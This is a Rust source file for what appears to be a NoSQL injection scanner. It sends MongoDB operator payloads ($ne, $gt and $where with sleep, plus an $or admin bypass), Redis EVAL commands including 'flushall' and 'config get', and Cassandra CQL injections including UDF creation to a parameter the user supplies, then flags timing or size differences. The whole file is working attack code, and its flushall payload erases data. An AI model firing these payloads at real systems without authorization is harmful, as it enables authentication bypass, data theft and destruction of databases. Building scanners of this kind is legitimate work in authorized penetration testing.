use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_else(|_| Client::new())
}

pub async fn mongo(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} MongoDB Injection Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        (
            "$where true",
            format!("{}[$where]=function(){{return true}}", param),
        ),
        (
            "$where sleep",
            format!("{}[$where]=function(){{sleep(5000);return true}}", param),
        ),
        ("$ne bypass", format!("{}[$ne]=null", param)),
        ("$gt bypass", format!("{}[$gt]=''", param)),
        ("$regex all", format!("{}[$regex]=.*", param)),
        ("$exists true", format!("{}[$exists]=true", param)),
        ("$or admin", format!("{}[$or][][username]=admin", param)),
        (
            "$in list",
            format!("{}[$in][]=admin&{}[$in][]=user", param, param),
        ),
    ];

    let baseline = send_req(&client, url, param, "test", token).await?;
    let baseline_size = baseline.1;

    for (name, payload) in &payloads {
        let target = if url.contains('?') {
            format!("{}&{}", url, payload)
        } else {
            format!("{}?{}", url, payload)
        };
        let mut req = client.get(&target);
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        let start = std::time::Instant::now();
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let elapsed = start.elapsed();
                let size_diff = body.len() as i64 - baseline_size as i64;
                let time_tag = if elapsed.as_millis() > 4500 {
                    "TIME-BASED".red().bold().to_string()
                } else {
                    format!("{}ms", elapsed.as_millis())
                };
                let diff_tag = if size_diff.abs() > 100 {
                    format!("size diff: {:+}", size_diff)
                } else {
                    "same".to_string()
                };
                println!(
                    "  {} {:25} status={} {} {}",
                    "*".cyan(),
                    name,
                    status,
                    time_tag,
                    diff_tag
                );
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    println!(
        "\n{} Look for response size changes or time delays.",
        "[*]".cyan().bold()
    );
    Ok(())
}

pub async fn redis(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Redis Lua Script Injection Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("EVAL ping", "EVAL \"return redis.call('ping')\" 0"),
        ("EVAL info", "EVAL \"return redis.call('info')\" 0"),
        ("EVAL keys", "EVAL \"return redis.call('keys','*')\" 0"),
        (
            "EVAL config",
            "EVAL \"return redis.call('config','get','*')\" 0",
        ),
        ("EVAL flushall", "EVAL \"return redis.call('flushall')\" 0"),
        (
            "EVAL sleep",
            "EVAL \"local i=0 while i<5000000 do i=i+1 end return 1\" 0",
        ),
        ("EVALSHA abuse", "EVALSHA 0 0"),
        ("SCRIPT LOAD", "SCRIPT LOAD \"return 1\""),
    ];

    for (name, payload) in &payloads {
        let target = if url.contains('?') {
            format!("{}&{}={}", url, param, url_encode(payload))
        } else {
            format!("{}?{}={}", url, param, url_encode(payload))
        };
        let mut req = client.get(&target);
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        let start = std::time::Instant::now();
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let elapsed = start.elapsed();
                let time_tag = if elapsed.as_millis() > 1000 {
                    "SLOW".red().bold().to_string()
                } else {
                    format!("{}ms", elapsed.as_millis())
                };
                let has_data = body.contains("redis")
                    || body.contains("role")
                    || body.contains("master")
                    || body.contains("slave");
                let data_tag = if has_data {
                    "DATA LEAK".red().bold().to_string()
                } else {
                    "no data".to_string()
                };
                println!(
                    "  {} {:25} status={} {} {}",
                    "*".cyan(),
                    name,
                    status,
                    time_tag,
                    data_tag
                );
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    Ok(())
}

pub async fn cassandra(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Cassandra CQL Injection Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Single quote", "' OR '1'='1"),
        ("UNION", "' UNION SELECT * FROM system_schema.tables --"),
        (
            "Batch abuse",
            "BEGIN BATCH INSERT INTO users (id) VALUES (1); APPLY BATCH;",
        ),
        ("Allow filtering", "' ALLOW FILTERING; --"),
        (
            "System keyspace",
            "' AND table_name IN (SELECT table_name FROM system_schema.tables) --",
        ),
        (
            "Time-based",
            "' AND timeuuid() = timeuuid() AND TTL('a') = 1 --",
        ),
        ("Function abuse", "' AND system.now() > 0 --"),
        (
            "UDF injection",
            "CREATE FUNCTION IF NOT EXISTS ps_exec(input text) LANGUAGE java AS 'return input;'",
        ),
    ];

    for (name, payload) in &payloads {
        let target = if url.contains('?') {
            format!("{}&{}={}", url, param, url_encode(payload))
        } else {
            format!("{}?{}={}", url, param, url_encode(payload))
        };
        let mut req = client.get(&target);
        if let Some(t) = token {
            req = req.header("Authorization", format!("Bearer {}", t));
        }
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let has_error = body.contains("cassandra")
                    || body.contains("CQL")
                    || body.contains("syntax")
                    || body.contains("InvalidQuery");
                let tag = if has_error {
                    "ERROR LEAK".red().bold().to_string()
                } else {
                    "no error".to_string()
                };
                println!("  {} {:25} status={} {}", "*".cyan(), name, status, tag);
            }
            Err(_) => {
                println!("  {} {:25} error", "*".red(), name);
            }
        }
    }

    Ok(())
}

pub async fn blind(
    url: &str,
    param: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} Blind NoSQL Injection Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let true_payload = format!("{}[$ne]=null", param);
    let false_payload = format!("{}[$eq]=__nonexistent__", param);

    let true_target = if url.contains('?') {
        format!("{}&{}", url, true_payload)
    } else {
        format!("{}?{}", url, true_payload)
    };
    let false_target = if url.contains('?') {
        format!("{}&{}", url, false_payload)
    } else {
        format!("{}?{}", url, false_payload)
    };

    let mut true_req = client.get(&true_target);
    let mut false_req = client.get(&false_target);
    if let Some(t) = token {
        true_req = true_req.header("Authorization", format!("Bearer {}", t));
        false_req = false_req.header("Authorization", format!("Bearer {}", t));
    }

    let true_resp = true_req.send().await?;
    let false_resp = false_req.send().await?;
    let true_status = true_resp.status().as_u16();
    let false_status = false_resp.status().as_u16();
    let true_body = true_resp.text().await?;
    let false_body = false_resp.text().await?;

    let true_size = true_body.len();
    let false_size = false_body.len();
    let size_diff = (true_size as i64 - false_size as i64).abs();

    println!(
        "  {} True condition  ($ne=null):  {} bytes, status={}",
        "*".cyan(),
        true_size,
        true_status
    );
    println!(
        "  {} False condition ($eq=fake):   {} bytes, status={}",
        "*".cyan(),
        false_size,
        false_status
    );
    println!("  {} Size difference: {} bytes", "*".cyan(), size_diff);

    if size_diff > 100 {
        println!(
            "\n{} Boolean-based blind NoSQL injection likely! Response differs between true/false.",
            "[!]".red().bold()
        );
    } else {
        println!(
            "\n{} No significant difference — testing time-based...",
            "[*]".cyan().bold()
        );

        let time_payload = format!("{}[$where]=function(){{sleep(5000);return true}}", param);
        let time_target = if url.contains('?') {
            format!("{}&{}", url, time_payload)
        } else {
            format!("{}?{}", url, time_payload)
        };
        let mut time_req = client.get(&time_target);
        if let Some(t) = token {
            time_req = time_req.header("Authorization", format!("Bearer {}", t));
        }
        let start = std::time::Instant::now();
        if let Ok(resp) = time_req.send().await {
            let elapsed = start.elapsed();
            let _ = resp.text().await;
            if elapsed.as_millis() > 4500 {
                println!(
                    "  {} Time-based: response took {}ms — VULNERABLE!",
                    "[!]".red().bold(),
                    elapsed.as_millis()
                );
            } else {
                println!(
                    "  {} Time-based: response took {}ms — not vulnerable",
                    "*".green(),
                    elapsed.as_millis()
                );
            }
        }
    }

    Ok(())
}

async fn send_req(
    client: &Client,
    url: &str,
    param: &str,
    value: &str,
    token: Option<&str>,
) -> anyhow::Result<(u16, usize)> {
    let target = if url.contains('?') {
        format!("{}&{}={}", url, param, value)
    } else {
        format!("{}?{}={}", url, param, value)
    };
    let mut req = client.get(&target);
    if let Some(t) = token {
        req = req.header("Authorization", format!("Bearer {}", t));
    }
    let resp = req.send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();
    Ok((status, body.len()))
}

fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' {
            result.push(c);
        } else {
            for b in c.to_string().bytes() {
                result.push_str(&format!("%{:02X}", b));
            }
        }
    }
    result
}
